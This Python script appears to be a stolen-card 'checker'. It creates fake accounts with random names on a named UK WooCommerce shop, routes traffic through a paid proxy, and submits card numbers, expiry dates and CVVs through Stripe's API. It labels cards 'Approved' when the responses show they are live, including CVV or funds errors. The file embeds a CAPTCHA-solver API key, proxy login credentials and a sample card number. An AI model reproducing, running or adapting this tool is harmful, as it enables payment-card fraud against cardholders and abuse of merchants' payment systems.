import re
import time,names

import base64
import random
import capsolver
import secrets
import base64
from requests import Session
from dataclasses import dataclass
import uuid,base64, json
from retry import retry
import random



class Solverv2:

    def solver(self,url,keysite):
        self.session = Session()
        capsolver.api_key = 'CAP-49921C094F791244557416016E4CD408'
        solution = capsolver.solve({"type": "ReCaptchaV2Task","websiteURL": url,"websiteKey": keysite})
        return solution

@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def correlation_id(self):
        self.id_corre = secrets.token_hex(16)
        return self.id_corre
    
    
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end

    
    @classmethod
    def Response(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', 'Charged $1.0'
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response
            
    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end






def RandomName(dato:str=None):
        if dato == 'username': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        elif dato == 'correo': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        elif dato == 'password': return f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        else: return 'Valores InCorrectos: username, password, correo'

class CutStr():
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
from requests import Session



class ssd:
    def main(self, card):
        try:
            self.Nombre = RandomName('username')
            self.UseMail = RandomName('correo')

            self.session = Session()
            self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.post('https://m.stripe.com/6', headers=headers)
            apigate2 = response.json()
            muid = apigate2["muid"]
            guid = apigate2["guid"]
            sid = apigate2["sid"]
            
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://www.daataadirect.co.uk/my-account/', headers=headers)
            self.nonce_registre = BehaviorsBraintree().QueryText(self.req_1.text,'name="woocommerce-register-nonce" value="','"')     
              
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.daataadirect.co.uk','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {
                'email': self.UseMail,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://www.daataadirect.co.uk/my-account/',
                'wc_order_attribution_session_start_time': '2025-03-14 03:05:46',
                'wc_order_attribution_session_pages': '2',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': self.nonce_registre,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            self.session.post('https://www.daataadirect.co.uk/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', }
            self.session.get('https://www.daataadirect.co.uk/my-account/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/edit-address/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://www.daataadirect.co.uk/my-account/edit-address/billing/', headers=headers)
            self.edit_address_bill = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-edit-address-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.daataadirect.co.uk','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/edit-address/billing/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {
                'billing_first_name': 'Deerek',
                'billing_last_name': 'Dylan',
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': 'Times Square, Nueva York, EE. UU.',
                'billing_address_2': '',
                'billing_city': 'Manhattan',
                'billing_state': 'NY',
                'billing_postcode': '10036',
                'billing_phone': '5667849034',
                'billing_email': self.UseMail,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': self.edit_address_bill,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            self.session.post('https://www.daataadirect.co.uk/my-account/edit-address/billing/', headers=headers, data=data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/edit-address/billing/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.session.get('https://www.daataadirect.co.uk/my-account/edit-address/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/payment-methods/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_3 = self.session.get('https://www.daataadirect.co.uk/my-account/add-payment-method/', headers=headers)
            self.payment_nonce = BehaviorsBraintree().QueryText(self.req_3.text,'name="woocommerce-add-payment-method-nonce" value="','"')
            self.pk= BehaviorsBraintree().QueryText(self.req_3.text, '"key":"', '"')
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': 'application/json','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','origin': 'https://js.stripe.com','priority': 'u=1, i','referer': 'https://js.stripe.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = f'type=card&card[number]={self.ccs[0]}&card[cvc]={self.ccs[3]}&card[exp_month]={self.ccs[1]}&card[exp_year]={self.ccs[2]}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+split-card-element&referrer=https%3A%2F%2Fwww.daataadirect.co.uk&time_on_page=29988&key={self.pk}&_stripe_version=2022-08-01'
            self.req_4 = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            self.id= BehaviorsBraintree().QueryText(self.req_4.text, '"id": "', '"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.daataadirect.co.uk','priority': 'u=0, i','referer': 'https://www.daataadirect.co.uk/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {
                'payment_method': 'eh_stripe_pay',
                'woocommerce-add-payment-method-nonce': self.payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
                'eh_stripe_pay_token': self.id,
                'eh_stripe_pay_currency': 'gbp',
                'eh_stripe_pay_amount': '0',
                'eh_stripe_card_type': 'visa',
            }

            stripe = self.session.post('https://www.daataadirect.co.uk/my-account/add-payment-method/', headers=headers, data=data,)
            self.session.close()
            
            req3 = stripe.text
            

 
            
            if 'Payment method successfully added.' in stripe.text:  return 'Approved! ✅', 'Charged $1.0'

            resp_match = re.search(r'<div class="message-container[^>]*>\s*<span[^>]*></span>\s*(.*?)\s*</div>', req3, re.DOTALL)

            if resp_match:
                resp = resp_match.group(1).strip()
                
    
                if "Your card's security code is incorrect." in resp:
                    msg = "Aprobada! ✅"
                    respuesta = resp

                elif "Insufficient Funds" in resp:
                    msg = "Aprobada! ✅"
                    respuesta = resp
                else:
                    msg = "Declinada! ❌"
                    respuesta = resp
                return msg, respuesta

        except: 
                return 'Payment Declined! ❌','Your card was declined.'



if __name__ == "__main__":
    card = '4426441313931192|10|2028|818'
    print(ssd().main(card))